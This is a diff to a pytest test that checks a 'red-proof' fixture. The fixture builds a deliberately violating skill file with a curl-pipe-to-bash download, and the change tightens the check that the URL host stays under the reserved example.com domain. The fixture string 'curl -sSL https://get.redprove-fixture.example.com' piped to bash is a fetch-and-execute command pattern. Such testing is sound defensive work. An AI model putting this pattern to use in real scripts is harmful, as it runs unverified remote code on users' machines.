@@ -17,6 +17,7 @@ inside the workflow itself on every run.
 """
 from __future__ import annotations
 
+import re
 from pathlib import Path
 
 import pytest
@@ -183,7 +184,19 @@ def test_redprove_builds_a_violating_skill_without_committing_one(tmp_path):
 
     body = skill.read_text(encoding="utf-8")
     assert "curl" in body and "| bash" in body, "fixture lost the violating shape"
-    assert ".example.com/" in body, "fixture host must stay under the reserved example.com"
+
+    # Parse the host out rather than substring-matching the URL: the fixture must
+    # stay under example.com, reserved by RFC 2606 and not resolvable, so the
+    # red-proof can never point a reader (or an agent) at a live host.
+    from urllib.parse import urlsplit
+
+    urls = re.findall(r"https?://\S+", body)
+    assert urls, "fixture no longer contains a download URL"
+    for url in urls:
+        host = urlsplit(url).hostname or ""
+        assert host == "example.com" or host.endswith(".example.com"), (
+            f"fixture URL host {host!r} is outside the reserved example.com domain"
+        )
 
     # The assembled string must not appear verbatim in the script that assembles it.
     marker = "curl -sSL http" + "s://get.redprove-fixture.example.com"
